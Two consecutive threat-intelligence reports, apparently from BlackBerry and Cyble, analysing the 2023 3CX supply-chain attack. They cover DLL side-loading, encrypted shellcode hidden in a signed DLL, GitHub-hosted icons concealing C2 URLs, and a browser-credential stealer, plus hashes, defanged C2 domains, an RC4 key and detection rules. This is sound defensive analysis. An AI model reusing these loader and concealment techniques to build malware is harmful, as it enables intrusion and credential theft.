RESEARCH & INTELLIGENCE / 03.31.23 / The BlackBerry Research & Intelligence Team
•	Share on Twitter
•	Share on Facebook
•	Share on Linked In
•	Email
 
SUMMARY     
On March 29, it became publicly known that business communications supplier 3CX had suffered a compromise, with several Trojanized versions of their VOIP software 3CXDesktopApp deployed worldwide. This includes versions used by Windows® and macOS® clients.
While several users reported alerts by the middle of March 2023, most believed those were false positives.
Based on our initial assessment, the 3CX supply chain operation most likely began at the beginning of fall 2022.
TECHNICAL ANALYSIS
Context
On March 30, 3CX publicly issued a security alert, stating that at least some of their applications had been Trojanized and delivered via the supply chain to their customers. The day before, on March 29, the attack was covered by multiple technical analyses from the industry, including the implants for macOS.
Since the supply chain attack may affect everyone who uses the affected 3CXDesktopApp, and given the number of potential victims worldwide, we took a look at the timelines behind the attack, as well as technical aspects that have not yet been discussed, and present our findings to you in this blog post.
What is the 3CXDesktopApp?
The 3CXDesktopApp is a legitimate voice and video conferencing software product, offering “call, video, and live chat.” It was developed by 3CX, a business communications software company founded in 2005, when Voice over Internet Protocol (VOIP) was still an emerging technology. According to the company website, 3CX has approximately 600,000 customer companies, with over 12 million daily users in 190 countries.
The software-based PBX phone system is currently available on Windows, Linux®, Android™, and iOS®. The 3CX website lists customer organizations in sectors including Manufacturing, Automotive, Food and Beverage, Hospitality, and Managed Information Technology Service Providers (MSPs).
Attack Vector
While it's unclear how the threat actor initially obtained access to the 3CX network, the delivery mechanism of Trojanized apps is via a supply chain by distributing melted clean applications with malicious libraries integrated into the installers for Windows and macOS.
This is not uncommon in these type of attacks, where a vendor gets compromised by a threat actor, who inserts malware into the vendor’s supply chain; in this case, into their software library. This malicious software is then distributed to the customers without the vendor's knowledge.
A couple of weeks ago, different 3CX users on the Internet reported issues with a new version of the 3CX app while installing it on their machines.
 
Figure 1: User discussing issues with the latest 3CX versions. (SOURCE: Reddit; r/3CX)
Weaponization
The infection starts with a Trojanized installer (MSI) of the 3CX VOIP software. The malicious code allegedly found its way into the release process via a compromised dependency. This means that the installer containing the malicious code was signed with their code signing certificate, so the installer appears perfectly legitimate.
Bundled in this installer are modified copies of ffmpeg.dll and d3dcompiler_47.dll. When the 3CX desktop client is started, its dependencies (including ffmpeg.dll) are loaded. Ffmpeg.dll has a modified DllMain (the function used for dll initialization) that loads a malicious portable executable (PE) file embedded in the d3dcompiler_47.dll.
Ffmpeg starts by using GetModuleFilenameW to get the path of the executing assembly (the 3CX desktop client binary). It then uses this path to locate d3dcompiler_47.dll, which is installed in the same folder. It walks through the PE headers of the d3dcompiler_47.dll to find the security directory. This data directory is usually used to store certificate information, but the modified copy has an encrypted shellcode blob inserted after the certificate data. Ffmpeg finds the start of this shellcode blob by looking for a hex marker “FEEDFACE”. It then reads the encrypted payload into a buffer on the heap and decrypts it. After the buffer has been decrypted, it is then marked as executable using VirtualProtect, and finally the ffmpeg code calls into the payload.
The payload is a reflectivised PE with an embedded name of “samcli.dll” that was built on January 10th (localized time) of this year.
 
Figure 2: samcli.dll
After the PE is loaded its export DllGetClassObject is called and the command line “1200 2400 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 3CXDesktopApp/18.11.1197 Chrome/102.0.5005.167 Electron/19.1.9 Safari/537.36" is passed in. This export starts a new thread to continue execution within the payload and returns allowing the 3CX software to continue its execution as normal.
In the new thread this payload writes some random data to a file called “manifest” or reads the random data if the file is already present. It proceeds to read the MachineGuid subkey from HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography which is saved for later use in command-and-control (C2) communications. To identify which C2 the payload should communicate with it, it first downloads an icon from GitHub using a URL of the form:
hxxps://raw.githubusercontent[.]com/IconStorages/images/main/icon[1-15].ico
The icon number is generated randomly at runtime (rand() % 15 + 1) and it continues until an icon is successfully downloaded:
 
After an icon is downloaded, it searches from the end of the file backwards until it encounters the marker ‘$’:
 
 
The data after this marker is then extracted, base64 decoded and AES-GCM decrypted to reveal a C2 URL. The payload then makes a POST request to the C2 with a request header cookie:
__tutma={machine-guid}
Where the machine-guid was the one read from the registry earlier. The response is expected to contain three fields: meta, description and URL. The response is then parsed by the payload and some shellcode is decrypted from it, which is then subsequently loaded into memory, protected as executable, and run.
Given that the C2 servers are no longer running, without any responses it is impossible to determine what the future payloads were intended to do.
Timeline of the Attack
According to the vendor, its Electron Windows App shipped in Update 7 was affected at least in versions 18.12.407 and 18.12.416 for Windows, and 18.11.1213, 18.12.402, 18.12.407, and 18.12.416 for macOS.
Since each version release has a timeframe for development, testing, and then release, it's reasonable to conclude that the threat actor behind this attack had access to the vendor's infrastructure for some time while deploying malicious installers.
If we trust in the PE implants' timestamps used in the attack, it reveals the following timeline:
ffmpeg.dll (Trojanized dll)
253f3a53796f1b0fbe64f7b05ae1d66bc2b0773588d00c3d2bf08572a497fa59         2824448         Sat, Nov 12 2022, 4:12:14 - 64 Bit DLL
7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896    2814976         Sat, Nov 12 2022, 4:12:14 - 64 Bit DLL
c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02         2824448         Sat, Nov 12 2022, 4:12:14 - 64 Bit DLL
3CXDesktopApp.exe (Melted installer)
dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc     149268224      Wed, Nov 30 2022, 15:56:23 - 64 Bit EXE
fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405      149268224      Wed, Nov 30 2022, 15:56:23 - 64 Bit EXE
samcli.dll (payload)
f5fdefaa5321e2cea02ef8b479de8ec3c5505e956ea1484c84a7abb17231fe24           275627          Wed, Jan 11 2023, 2:21:42 - 64 Bit DLL
If the timestamps are original, then the Trojanization probably began by the beginning of November 2022. That might indicate that the initial intrusion had taken place even earlier.
Network Infrastructure
Based on the samples and network traffic analysis, we found a few domains of note. It's a referential list, which only includes some of the domains we have not been able to confirm as connected to the campaign.  
Domain/IP	First Seen
pbxsources[.]com	2023-01-04
officestoragebox[.]com	2022-11-17 (reused domain)
visualstudiofactory[.]com	2022-11-17
azuredeploystore[.]com	2022-12-07
msstorageboxes[.]com	2022-12-09
officeaddons[.]com	2022-12-12 (reused domain)
sourceslabs[.]com	2022-12-09
pbxcloudeservices[.]com	2022-12-23
pbxphonenetwork[.]com	2022-12-26
akamaitechcloudservices[.]com	2023-01-04
 
 
Figure 3: Attack development timeline (domains and implants)
Targets
Based on BlackBerry’s Cylance® telemetry, we have seen registered attack attempts in Australia, the United States, and the United Kingdom. Targeted industries are HealthCare, Pharmaceutical, Information Technologies, and Financial Corporations.
Given the nature of the attack and 3CX’s customer directory, the complete list of potentially affected industries is more extensive.
CONCLUSIONS
Given the complexity of the attack and its scale, it's highly likely the threat actor behind this attack is a Nation State. When a supply chain attack occurs, the initial number of victims is extensive, while the real target may stay unknown unless it receives the final payload, which is the operation's goal. At the moment of writing this post, it is unclear what the shortlist of final targets is. These are usually manually approved by adversaries before delivering the final stage payload.
Our initial samples and network infrastructure analysis indicate that the initial phase of this operation took place somewhere between the end of summer and the beginning of fall 2022. Many organizations lacking mature security operations capabilities will find it hard to detect this type of activity, and when they do, these alerts are often ignored in the midst of many false positives produced by poorly managed security solutions.
It’s essential for any company today to have a workable strategy to detect and prevent supply chain attacks. That includes cyber threat intelligence tools to extend visibility and high-fidelity detection, as well as log retention for further forensic analysis. A defensible security architecture augmented by continuous monitoring and response may significantly reduce the risks of the 2nd stage payload execution and data exfiltration.
 
APPENDIX 1 – CylanceOptics Hunting Queries
Query to detect “ffmpeg.dll” creation
{
    "Name": "3CX ffmpeg File Create",
    "Description": "Detects when ffmpeg.dll file is created",
    "Id": "1cd91ca6-fbd4-4000-b4e1-2f1623e5a526",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "Windows"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "dllCreate",
            "Scope": "Global",
            "Function": "(a)",
            "FieldOperators": {
                        "a": {
                    "Type": "Contains",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetFile",
                        "data": "Path"
                        },
                        {
                        "source": "Literal",
                        "data": "ffmpeg.dll"
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetFile",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "File",
                        "SubCategory": "*",
                        "Type": "Create"
                    }
                }
            ]
        }
    ]
}
 
Query to detect C2 communication attempts by ffmpeg.dll
{
    "Name": "3CX ffmpeg DNS Request",
    "Description": "Detects when ffmpeg.dll reaches out to known 3CX domains.",
    "Id": "7638ba09-1254-4573-968d-fab9ee3f9396",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "Windows"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "domainRequest",
            "Scope": "Global",
            "Function": "(a&b)",
            "FieldOperators": {
                        "a": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "InstigatingProcess",
                        "data": "Name"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "ffmpeg.dll",
                            "ffmpeg"
                        ]
                        }
                    ]
                },
                "b": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetDnsRequest",
                        "data": "Responses/A/1/QuestionName"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "3cx",
                            "akamaicontainer",
                            "akamaitechcloudservices",
                            "azuredeploystore",
                            "azureonlinecloud",
                            "azureonlinestorage",
                            "dunamistrd",
                            "glcloudservice",
                            "journalide",
                            "msedgepackageinfo",
                            "msstorageazure",
                            "msstorageboxes",
                            "officeaddons",
                            "officestoragebox",
                            "pbxcloudeservices",
                            "pbxphonenetwork",
                            "pbxsources",
                            "qwepoi123098",
                            "sbmsa",
                            "sourceslabs",
                            "visualstudiofactory",
                            "zacharryblogs"
                        ]
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetDnsRequest",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetNetworkConnection",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "Network",
                        "SubCategory": "DNS",
                        "Type": "Request"
                    }
                }
            ]
        }
    ]
}
 
Query to detect libffmpeg.dylib creation in the system (macOS)
{
    "Name": "macOS 3CX ffmpeg File Create",
    "Description": "Detects when libffmpeg.dylib file is created",
    "Id": "5ef0fb47-2102-4351-9d3a-4872dd96734a",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "macOS"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "dylibCreate",
            "Scope": "Global",
            "Function": "(a)",
            "FieldOperators": {
                        "a": {
                    "Type": "Contains",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetFile",
                        "data": "Path"
                        },
                        {
                        "source": "Literal",
                        "data": "libffmpeg.dylib"
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetFile",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "File",
                        "SubCategory": "*",
                        "Type": "Create"
                    }
                }
            ]
        }
    ]
}
 
Query to detect C2 communication attempts by libffmpeg.dylib (macOS)
{
    "Name": "macOS 3CX libffmpeg DNS Request",
    "Description": "Detects when libffmpeg.dylib reaches out to known 3CX domains.",
    "Id": "0072eda0-c235-4345-aaf3-5905cb1c0806",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "macOS"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "domainRequest",
            "Scope": "Global",
            "Function": "(a&b)",
            "FieldOperators": {
                        "a": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "InstigatingProcess",
                        "data": "Name"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "libffmpeg.dylib",
                            "libffmpeg"
                        ]
                        }
                    ]
                },
                "b": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetDnsRequest",
                        "data": "Responses/A/1/QuestionName"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "3cx",
                            "akamaicontainer",
                            "akamaitechcloudservices",
                            "azuredeploystore",
                            "azureonlinecloud",
                            "azureonlinestorage",
                            "dunamistrd",
                            "glcloudservice",
                            "journalide",
                            "msedgepackageinfo",
                            "msstorageazure",
                            "msstorageboxes",
                            "officeaddons",
                            "officestoragebox",
                            "pbxcloudeservices",
                            "pbxphonenetwork",
                            "pbxsources",
                            "qwepoi123098",
                            "sbmsa",
                            "sourceslabs",
                            "visualstudiofactory",
                            "zacharryblogs"
                        ]
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetDnsRequest",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetNetworkConnection",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "Network",
                        "SubCategory": "DNS",
                        "Type": "Request"
                    }
                }
            ]
        }
    ]
}
 
Query to detect generic request to C2s used in the 3CX attack on Windows
{
    "Name": "3CX DNS Request",
    "Description": "Detects when a dns request is made to known 3CX domains.",
    "Id": "6abb19ad-9490-488f-a9e0-dc51694d4b1b",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "Windows"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "domainRequest",
            "Scope": "Global",
            "Function": "(a)",
            "FieldOperators": {
                        "a": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetDnsRequest",
                        "data": "Responses/A/1/QuestionName"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "3cx",
                            "akamaicontainer",
                            "akamaitechcloudservices",
                            "azuredeploystore",
                            "azureonlinecloud",
                            "azureonlinestorage",
                            "dunamistrd",
                            "glcloudservice",
                            "journalide",
                            "msedgepackageinfo",
                            "msstorageazure",
                            "msstorageboxes",
                            "officeaddons",
                            "officestoragebox",
                            "pbxcloudeservices",
                            "pbxphonenetwork",
                            "pbxsources",
                            "qwepoi123098",
                            "sbmsa",
                            "sourceslabs",
                            "visualstudiofactory",
                            "zacharryblogs"
                        ]
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetDnsRequest",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetNetworkConnection",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "Network",
                        "SubCategory": "DNS",
                        "Type": "Request"
                    }
                }
            ]
        }
    ]
}
 
Query to detect generic request to C2s used in the 3CX attack on macOS
{
    "Name": "macOS 3CX DNS Request",
    "Description": "Detects when a dns request is made to known 3CX domains.",
    "Id": "a2ca3af8-778d-4a6e-ac05-400ee2bf2ae6",
    "Version": 1,
    "SchemaVersion": 1,
    "RuleSource": "Cylance",
    "ObjectType": "DetectionRule",
    "Severity": "High",
    "TBM": "High",
    "Product": {"Name": "CylanceOPTICS"},
    "Plugin": {"Name": "OpticsDetector"},
    "OperatingSystems": [{"Name": "macOS"}],
    "PostCompletionActions": ["GenerateDetectionEvent"],   
    "AlertVolume": "TBD",
    "MaximumConcurrentActivations": 10,
    "ActivationLifetimeLimit": "00:10:00",
    "ActivationCanUtilizeDeviceStateEvents": false,
    "AllowMultipleActivationsPerContext": true,
    "States": [
        {
            "Name": "domainRequest",
            "Scope": "Global",
            "Function": "(a)",
            "FieldOperators": {
                        "a": {
                    "Type": "ContainsAny",
                    "OperandType": "String",
                    "Options": {"IgnoreCase": true},
                    "Operands": [
                        {
                        "source": "TargetDnsRequest",
                        "data": "Responses/A/1/QuestionName"
                        },
                        {
                        "source": "LiteralSet",
                        "data": [
                            "3cx",
                            "akamaicontainer",
                            "akamaitechcloudservices",
                            "azuredeploystore",
                            "azureonlinecloud",
                            "azureonlinestorage",
                            "dunamistrd",
                            "glcloudservice",
                            "journalide",
                            "msedgepackageinfo",
                            "msstorageazure",
                            "msstorageboxes",
                            "officeaddons",
                            "officestoragebox",
                            "pbxcloudeservices",
                            "pbxphonenetwork",
                            "pbxsources",
                            "qwepoi123098",
                            "sbmsa",
                            "sourceslabs",
                            "visualstudiofactory",
                            "zacharryblogs"
                        ]
                        }
                    ]
                }
            },
            "ActivationTimeLimit": "-0:00:00.001",
            "Actions": [
                {
                    "Type": "AOI",
                    "ItemName": "InstigatingProcess",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetDnsRequest",
                    "Position": "PostActivation"
                },
                {
                    "Type": "AOI",
                    "ItemName": "TargetNetworkConnection",
                    "Position": "PostActivation"
                }
            ],
            "HarvestContributingEvent": true,
            "Filters": [
                {
                    "Type": "Event",
                    "Data": {
                        "Category": "Network",
                        "SubCategory": "DNS",
                        "Type": "Request"
                    }
                }
            ]
        }
    ]
}
 

 
A Comprehensive Analysis of the 3CX Attack
•	March 31, 2023
Cyble Research & Intelligence Labs Analyzes The Recent 3CX Supply Chain Attack And The Malicious Methods Employed By The Attackers.
InfoStealer Deployed in a Massive Supply Chain Attack
An ongoing supply chain attack has been reported, targeting customers of 3CX, a VoIP IPBX software development company. This attack has been attributed to North Korean Threat Actors (TAs). Currently, the 3CX DesktopApp can be accessed on various platforms, including Windows, macOS, Linux, and mobile.
However, reports have indicated that the ongoing activity related to the supply chain attack has been detected on both Windows and macOS operating systems. The attack involves a Trojanized version of the 3CX, a Voice Over Internet Protocol (VOIP) desktop client, which has been digitally signed. 3CX’s Phone System is utilized by over 600,000 companies globally and has over 12 million daily users.
Drag blocks and elements to start building your campaign
 
 
The highlights of the incident are as follows:
•	On March 29, a significant number of EDR providers and antivirus solutions began to identify and signal a warning for the legitimate 3CXDesktopApp.exe binary, which was signed.
•	This binary had initiated an update procedure that ultimately led to malicious activity and communication with Command-and-Control servers.
•	The 3CX download that was accessible on the official public website was infected with malware. Systems that had already been installed would undergo updates that would ultimately result in the download of this malware.
•	The attack involves a multi-stage process that starts with the 3CX desktop application.
•	The process of retrieving malicious payloads from GitHub involves a delay of 7 days before the download takes place. This delay could be an attempt to evade detection by security systems monitoring suspicious activities.
•	As per reports, the last stage of the attack involves stealing information. This malware can gather system data and take control of data and login credentials stored in user profiles on various web browsers, including Chrome, Edge, Brave, and Firefox.
•	Both the Windows and macOS installers for 3CX have been impacted.
•	As per researchers, the evidence from GitHub indicates that the infrastructure utilized by the Windows variant was activated on December 7, 2022.
•	Additionally, the domains and web infrastructure utilized in the attacks were registered as early as November 2022.
The 3CX Phone Management System can be implemented on-premises. Upon further investigation, we found that over 240,000 publicly exposed instances of this application.
The figure below shows the Shodan search results.
 Figure 1 – Exposed Instances
We also came across a Reddit post where a user reported suspicious activity that occurred after updating the 3CX desktop on March 24, 2023. According to the user, the 3cxdesktopapp.exe program accessed browser caches, as revealed by EDR file history data.
 Figure 2 – Reddit Post
According to 3CX, the recent attack was a result of infected bundled libraries that were compiled into the Windows Electron App through GIT. The vendor has also stated, “Electron Windows App shipped in Update 7, version numbers 18.12.407 & 18.12.416, includes a security issue. Anti-Virus vendors have flagged the executable 3CXDesktopApp.exe and in many cases uninstalled it. Electron Mac App version numbers 18.11.1213, 18.12.402, 18.12.407 & 18.12.416 are also affected.”
The .msi file, when executed, drops two malicious files – “ffmpeg.dll” and “d3dcompiler_47.dll” – in the location C:\Users[user_name]\AppData\Local\Programs\3CXDesktopApp\app.
The infection begins when the benign file “3CXDesktopApp.exe” loads “ffmpeg.dll”. Then, “ffmpeg.dll” decrypts the encrypted code from “d3dcompiler_47.dll”, which seems to be a shellcode.
This shellcode loads another DLL file that tries to access the IconStorages GitHub page to find an .ico file containing the encrypted Command-and-Control (C&C) server. After locating the C&C server, the backdoor establishes a connection to retrieve the potential final payload.
The figure below shows the infection flow.
 Figure 3 – Infection chain
Technical Analysis
The MSI package installer that has been compromised has a digital signature, and its appearance resembles that of a legitimate file, as shown below.
 Figure 4 – Digitally signed MSI installer
Upon installation, the MSI package installer drops files such as “3CXDesktopApp.exe”, “ffmpeg.dll”, and “d3dcompiler_47.dll” in the %LocalAppData% directory of the system.
•	%LocalAppData%\Programs\3CXDesktopApp\app\
These files are associated with malicious behavior and are accompanied by other supporting files.
The figure below displays the directory where the “3CXDesktopApp” application has been installed.
 Figure 5 – 3CXDesktop installation folder
After installation, the “3CXDesktopApp.exe” file is executed, which is usually benign but can be utilized to load the malicious DLL, as shown below.
 Figure 6 – 3CXDesktop.exe loading ffmpeg.dll file
The figure below illustrates the process tree of the “3CXDesktopApp” application.
 Figure 7 – Process tree
The “3CXDesktopApp.exe” loads the “ffmpeg.dll” file, which is a malicious DLL that has been specifically designed to read, load, and execute harmful shellcode from the “d3dcompiler_47.dll” file.
When executed, the “ffmpeg.dll” creates a new event, “AVMonitorRefreshEvent“, identifies the current file path, and searches for the next file in the sequence, which is “d3dcompiler_47.dll”. Once identified, the “ffmpeg.dll” loads the “d3dcompiler_47.dll” file into memory, as illustrated in the assembly code shown below.
 Figure 8 – ffmpeg.dll file is loading d3dcompiler_47.dll
Although the loaded “d3dcompiler_47.dll” is signed by Microsoft, it has an encrypted payload embedded within it. The “ffmpeg.dll” file now identifies the encrypted payload indicated by a particular marker, ‘0xCEFAEDFE’, as shown below.
 Figure 9 – Identifying encrypted payload in “d3dcompiler_47.dl”l
Once the encrypted payload has been identified, the “ffmpeg.dll” proceeds to decrypt the RC4 stream using the key “3jB(2bsG#@c7“. This decryption process results in a shellcode which is then executed by the DLL file.
The figure below shows the RC4 loop and decrypted shellcode function.
 Figure 10 – RC4 loop and decrypted shellcode
After decryption, the “ffmpeg.dll” file employs the VirtualProtect() function to alter the memory access permissions of the shellcode. Once the permissions have been changed, the malware proceeds to execute the payload.
An embedded DLL file is present within the decrypted shellcode, as shown in the below figure, which appears to be functioning as a loader for another PE file.
 Figure 11 – Embedded DLL file inside Shellcode
After being loaded and executed, the embedded DLL file in the shellcode initiates a sleep state of 7 days before trying to establish communication with Command and Control (C&C) servers. Subsequently, the DLL will attempt to access a GitHub repository that contains an .ICO file.
 Figure 12 – Hardcoded GitHub link to download the .ICO file
This ICO file comprises the encrypted C&C strings, which are encoded using Base64 and encrypted with AES & GCM encryption. The Base64 contents are located at the end of the ICO image file, as shown below.
 Figure 13 – Base64-encoded string at the end of ICO file
Upon execution, the DLL file decrypts the C&C URLs from the ICO files for downloading additional payloads from the remote server. To obtain distinct C&C URLs, the malware randomly selects an ICO file from a GitHub repository. Unfortunately, we were unable to verify the specific characteristics of these payloads as the corresponding GitHub repository was taken down prior to this analysis.
Researchers discovered that the final stage of malware is a stealer, which can extract system information and steal sensitive information from popular web browsers, such as Chrome, Edge, Brave, and Firefox.
Conclusion
The potential damage caused by the 3CXDesktopApp supply chain attack is significant, including the theft of sensitive user data. Organizations affected by this attack should immediately take steps to prevent it from causing widespread harm. The current investigation suggests that the threat actor behind this attack is skilled and persistent.
The consequences of such an attack, such as financial loss, reputational impact, and the loss of customer trust, are severe. It is crucial that organizations remain vigilant and take proactive measures to secure their supply chains to prevent similar attacks in the future.
Our Recommendations
We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below:
•	Thoroughly investigate all systems to determine the scope and extent of the attack, including identifying all affected systems and data.
•	Conduct regular security audits of your supply chain to ensure that all third-party software and components are trustworthy and secure.
•	Monitor your network regularly for any suspicious activity or behavior indicating a security breach, such as unauthorized access attempts or data exfiltration.
•	Stay up-to-date with the latest threat intelligence and security news to stay informed about emerging threats and vulnerabilities. This will help to mitigate risks proactively and respond quickly in the event of an attack.
•	Using a reputed antivirus and internet security software package is recommended on connected devices, including PCs, laptops, and mobile devices.
•	Block URLs that could be leveraged to spread malware.
MITRE ATT&CK® Techniques  
Tactic	Technique ID  	Technique Name  
Initial Access 	T1195
Supply Chain Compromise
Execution	T1204.002
User Execution: Malicious File
Defense Evasion	T1140
T1027
T1574.002 T1497.003
Deobfuscate/Decode Files or Information
Obfuscated Files or Information
Hijack Execution Flow: DLL Side-Loading Virtualization/Sandbox Evasion: Time-Based Evasion
Credential Access  	T1555
T1539  
Credentials from Password Stores  
Steal Web Session Cookie  
Command and Control	T1071
Application Layer Protocol
Indicators of Compromise (IOCs)
Indicators	Indicator Type	Description
f3d4144860ca10ba60f7ef4d176cc736
bea77d1e59cf18dce22ad9a2fad52948fd7a9efa
aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868	MD5
SHA1
SHA256	3CX Windows Installer
0eeb1c0133eb4d571178b2d9d14ce3e9
bfecb8ce89a312d2ef4afc64a63847ae11c6f69e
59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983	MD5
SHA1
SHA256	3CX Windows Installer
5729fb29e3a7a90d2528e3357bd15a4b
19f4036f5cd91c5fc411afc4359e32f90caddaac
5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290	MD5
SHA1
SHA256	3CX macOS Installer File
d5101c3b86d973a848ab7ed79cd11e5a
3dc840d32ce86cebf657b17cef62814646ba8e98
e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec	MD5
SHA1
SHA256	3CX macOS Installer File
82187ad3f0c6c225e2fba0c867280cc9
20d554a80d759c50d6537dd7097fed84dd258b3e
11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03	MD5
SHA1
SHA256	Malicious DLL
74bc2d0b6680faa1a5a76b27e5479cbc
bf939c9c261d27ee7bb92325cc588624fca75429
7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896	MD5
SHA1
SHA256	Malicious DLL
cad1120d91b812acafef7175f949dd1b09c6c21a	SHA1  	Stealer Payload
akamaicontainer[.]com
akamaitechcloudservices[.]com
azuredeploystore[.]com
azureonlinecloud[.]com
azureonlinestorage[.]com
dunamistrd[.]com
glcloudservice[.]com
journalide[.]org
msedgepackageinfo[.]com
msstorageazure[.]com
msstorageboxes[.]com
